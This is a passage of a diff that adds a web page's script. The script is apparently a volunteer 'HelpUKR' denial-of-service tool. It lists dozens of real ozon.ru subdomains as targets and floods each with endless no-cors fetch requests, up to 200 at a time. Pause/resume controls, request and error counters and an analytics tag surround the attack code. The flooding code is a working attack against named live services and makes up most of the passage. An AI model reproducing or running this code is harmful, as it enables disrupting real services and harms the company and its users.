+		    'http://learning.ozon.ru',
+		    'http://api.ozon.ru',
+		    'http://bigsale.ozon.ru',
+		    'http://news.ozon.ru',
+		    'http://all.ozon.ru',
+		    'http://merchant-platform.ozon.ru',
+		    'http://goschool.ozon.ru',
+		    'http://marketplace.ozon.ru',
+		    'http://sdweb.test.ozon.ru',
+		    'http://megasale.ozon.ru',
+		    'http://mmedia.ozon.ru',
+		    'http://ballon.ozon.ru',
+		    'http://birthday.ozon.ru',
+		    'http://support.ozon.ru',
+		    'http://foody.ozon.ru',
+		    'http://smtp-relays.ozon.ru',
+		    'http://blog.ozon.ru',
+		    'http://forum.ozon.ru',
+		    'http://vpn.ozon.ru',
+		    'http://user-account.ozon.ru',
+		    'http://global.university.ozon.ru',
+		    'http://retail-api.ozon.ru',
+		    'http://m.ozon.ru',
+		    'http://ws.ozon.ru',
+		    'http://alco.ozon.ru',
+		    'http://job.ozon.ru',
+		    'http://docs.ozon.ru',
+		    'http://sgateway.ozon.ru',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h4>${urls[i]}</h4>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
